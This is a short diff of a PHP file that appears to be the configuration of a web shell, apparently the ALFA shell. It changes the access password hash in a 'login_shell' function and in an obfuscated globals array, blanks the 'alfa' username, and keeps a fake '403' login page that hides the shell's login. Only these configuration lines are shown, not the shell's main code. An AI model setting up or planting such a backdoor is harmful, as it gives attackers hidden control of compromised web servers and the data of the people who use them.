@@ -1,6 +1,6 @@
 <?php
 session_start();
-$password = "0ea3bd619aa55fbab883aeb0be9bd367";
+$password = "fd456406745d816a45cae554c788e754";
 
 function login_shell()
 {
@@ -75,8 +75,8 @@ if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
 	Date:		Monday, September 14, 2020
 */
 $GLOBALS['oZgNypoPRU'] = array(
-    'username' => 'alfa',
-    'password' => '0ea3bd619aa55fbab883aeb0be9bd367',
+    'username' => '',
+    'password' => 'fd456406745d816a45cae554c788e754',
     'safe_mode' => '0',
     'login_page' => '403',
     'show_icons' => '1',
